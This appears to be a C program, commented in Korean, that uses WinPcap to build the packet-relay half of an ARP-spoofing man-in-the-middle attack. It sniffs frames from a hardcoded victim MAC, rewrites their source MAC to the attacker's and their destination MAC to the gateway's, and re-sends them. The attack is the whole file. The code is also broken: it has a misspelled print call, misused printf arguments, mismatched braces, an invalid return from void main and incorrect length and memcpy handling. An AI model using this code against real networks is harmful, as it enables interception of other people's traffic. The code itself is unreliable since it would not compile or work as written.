#include<WinSock2.h> // htons(), htonl() 함수를 사용
#include<pcap.h> // 네트워크 프로그래밍 함수를 제공
#include<stdio.h>
#include<stdint.h> // 여러 자료형을 정리하여 제공
#include<string.h>


#pragma warning(disable:4996)
#pragma warning(disable:6011)

#define ETH_LEN 6
#define IP_LEN 4

#define ETHERTYPE_ARP 0x0806

#pragma pack(push, 1)
typedef struct ether_header // 이더넷 부분의 값
{
	uint8_t dst_host[ETH_LEN]; // uint8_t는 0~255까지의 범위를 갖는다. 
	uint8_t src_host[ETH_LEN];
	uint16_t ether_type; // uint16_t는 0~65,535 범위를 가짐.
}ether_header;
#pragma pack(pop)

#pragma pack(push, 1)
typedef struct ipv4_header
{
	uint8_t ver; //버전
	uint8_t tos; //서비스유형
	uint16_t tlen; //전체 길이
	uint16_t identi; //식별
	uint16_t flags; //플래그
	uint8_t ttl; //실시간
	uint8_t proto; //프로토콜
	uint16_t crc; //체크섬
	uint8_t saddr[IP_LEN]; // 소스 주소
	uint8_t daddr[IP_LEN]; // 목적지 주소
	u_int op_pad; //옵션 및 패딩 
}ipv4_header;
#pragma pack(pop)






void main()
{
	pcap_if_t* alldevs;
	pcap_if_t* d;
	int inum;
	int i = 0;
	pcap_t* adhandle;
	char errbuf[PCAP_ERRBUF_SIZE];
	int res;
	struct tm* ltime;
	struct pcap_pkthdr* header;
	const u_char* pkt_data;
	time_t local_tv_sec;
	u_int ip_len;
	ipv4_header* ih;
	ether_header* eh;
	uint8_t victim[ETH_LEN] = { 0x18, 0x67, 0xb0, 0xca, 0xb4, 0xb1 };
	uint8_t attackerip[IP_LEN] = { 192,168,42,30 };
	uint8_t gatewaym[ETH_LEN] = { 0x88, 0x36, 0x6c, 0x7a, 0x56, 0x40 };
	uint8_t attackerm[ETH_LEN] = { 0xb0, 0x6e, 0xbf, 0xc6, 0xfa, 0x45 };


	/*로컬 컴퓨터에서 장치 목록을 검색*/
	if (pcap_findalldevs_ex(PCAP_SRC_IF_STRING, NULL, &alldevs, errbuf) == -1)
	{
		printf(stderr, "Error in pcap_findalldeves_ex: %s\n", errbuf);
		exit(1);
	}

	/*목록을 인쇄*/
	for (d = alldevs; d != NULL; d = d->next)
	{
		printf("%d. %s", ++i, d->name);
		if (d->description)
			printf(" (%s)\n", d->description);
		else
			printf(" (NO description available(사용 가능한 설명 없음))\n");
	}

	if (i == 0)
	{
		printf("\n 인터페이스를 찾을 수 없습니다! WinPcap이 설치되어 있는지 확인하십시오.\n");
		return -1;
	}

	printf("인터페이스 번호 (1-%d)를 입력하십시오 : ", i);
	scanf("%d", &inum);

	if (inum<1 || inum>i)
	{
		printf("\n인터페이스 번호가 범위를 벗어났습니다.\n");
		/*장치 목록 해제*/
		pcap_freealldevs(alldevs);
		return -1;
	}

	/*선택된 어댑터로 이동*/
	for (d = alldevs, i = 0; i < inum - 1; d = d->next, i++);

	/*장치열기*/
	if ((adhandle = pcap_open(d->name,			//장치이름
		65536,			//캡처 할 패킷 부분
		PCAP_OPENFLAG_PROMISCUOUS,	//무차별 모드
		1000,			//읽기 시간 초과
		NULL,			//원격 시스템에서의 인증
		errbuf			//오류 버퍼
	)) == NULL)
	{
		printf(stderr, "\n 어댑처를 열 수 없습니다. %s는 WinPcap에서 지원되지 않습니다. \n", d->name);
		/*장치 목록 해제*/
		pcap_freealldevs(alldevs);
		return -1;
	}


	printf("\nlistening on %s...\n", d->description);


	pcap_freealldevs(alldevs);

	while ((res = pcap_next_ex(adhandle, &header, &pkt_data)) >= 0) {
		if (res == 0)
			/*시간 초과*/
			continue;

		ih = (ipv4_header*)(pkt_data + 14);//이더넷 헤더 길이
		ip_len = (ih->ver & 0xf) * 4;
		eh = (ether_header*)pkt_data;
		u_int8_t* dstmac = eh->dst_host;
		u_int8_t* srcmac = eh->src_host;
		u_char* srcip = ih->saddr;
		u_char* dstip = ih->daddr;
		int count = 0;
		int count2 = 0;
		u_char* packet[10000];



			if (srcmac[0] == victim[0]&& srcmac[1] == victim[1] && srcmac[2] == victim[2] &&
				srcmac[3] == victim[3] && srcmac[4] == victim[4] && srcmac[5] == victim[5])
			{
				if (dstip[0] != attackerip[0] || dstip[1] != attackerip[1] || dstip[2] != attackerip[2]
					|| dstip[3] != attackerip[3]) {

					rintf("여기까지는됨\n");
					memcpy(eh->src_host, attackerm, sizeof(eh->src_host));
					memcpy(eh->dst_host, gatewaym, sizeof(eh->dst_host));
					memcpy(packet, &eh, sizeof(eh));
					header->len += sizeof(eh);

					pcap_sendpacket(adhandle, pkt_data, header->len);

					printf("%02x:%02x:%02x:%02x:%02x:%02x -> %02x:%02x:%02x:%02x:%02x:%02x\n",
						eh->src_host[0],
						eh->src_host[1],
						eh->src_host[2],
						eh->src_host[3],
						eh->src_host[4],
						eh->src_host[5],

						eh->dst_host[0],
						eh->dst_host[1],
						eh->dst_host[2],
						eh->dst_host[3],
						eh->dst_host[4],
						eh->dst_host[5]);
				}
				}
			}
		}
		if (res == -1) 
			printf("패킷 읽기 오류 : %s\n", pcap_geterr(adhandle));
			return -1;	
}
	